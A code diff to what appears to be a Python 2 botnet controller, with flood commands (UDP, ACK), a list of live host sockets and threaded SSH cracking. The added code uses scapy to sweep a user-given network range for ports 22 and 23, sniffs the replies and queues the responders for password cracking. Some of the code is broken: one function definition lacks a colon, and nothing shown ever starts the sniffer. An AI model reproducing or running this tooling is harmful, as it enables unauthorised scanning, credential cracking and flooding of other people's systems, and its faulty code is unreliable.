@@ -6,6 +6,8 @@ import socket
 import Queue
 import netaddr
 import threading
+import time
+from scapy.all import *
 
 
 def useage():
@@ -20,6 +22,13 @@ def useage_command():
              -U or --udp    **---udp flood
              -A or --ack    **---ack flood
     '''
+
+def cook(pkt):
+    global target_host
+    target_host.put((pkt[IP].src,pkt[TCP].sport))
+
+def sniffer()
+    sniff(filter='tcp and dst port 7474 and src port 22 or src port 23', prn=cook)
 
 live_host=Queue.Queue()
 target_host=Queue.Queue()
@@ -68,10 +77,16 @@ def main():
             print str(live_host.qsize())+'Host computer'
         elif command == '--scan' or command=='-s':
             ip_network_segment=raw_input('Please enter the segment you want to search for:')
-            Net_list=netaddr.IPNetwork(ip_network_segment)
-            for Net in Net_list:
-                target_host.put(str(Net))
-            for i in range(1000):
+            Net_ip_list=netaddr.IPNetwork(ip_network_segment)
+
+            for Net_ip in Net_ip_list:
+                send(IP(dst=str(Net_ip))/TCP(sport=7474,dport=(22,23)))
+
+            time.sleep(120)
+
+            I_want_threads=int(raw_input('Please enter the number of threads you wang:'))
+
+            for i in range(I_want_threads):
                 th=threading.Thread(target=ssh_cracked.scan,args=(target_host,search_results))
                 th.start()
         elif command =='-a' or command =='--attack':
@@ -96,9 +111,14 @@ def main():
                     l_h=live_host.get()
                     l_h[0].sendall('')
                     l_h_q.put(l_h)
+            else:
+                useage_command()
+
             while not l_h_q.empty():
                 x=l_h_q.get()
                 live_host.put(x)
+        else:
+            useage()
 
 
 if __name__ == '__main__':
